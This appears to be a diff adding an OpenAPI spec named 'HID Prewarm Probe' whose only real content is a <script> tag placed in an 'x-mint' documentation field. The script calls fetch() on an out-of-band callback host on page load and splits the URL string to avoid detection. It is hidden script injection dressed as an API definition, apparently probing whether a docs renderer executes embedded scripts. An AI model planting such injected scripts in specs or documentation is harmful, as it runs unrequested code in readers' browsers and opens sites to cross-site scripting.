@@ -1,0 +1,21 @@
+openapi: 3.0.4
+info:
+  title: HID Prewarm Probe
+  version: 1.0.0
+servers:
+  - url: https://api.example.com
+paths:
+  /hid-t22-x:
+    get:
+      summary: "HID T22 X PREWARM-PROBE"
+      operationId: hidt22x
+      x-mint:
+        content: |
+          HID-T22-X-START
+
+          <script>fetch('https:'+'//hid-t22x.dbboera80pk34s999rj0sm8am1tufr4qk.oast.site/prewarm-probe');</script>
+
+          HID-T22-X-END
+      responses:
+        '200':
+          description: ok
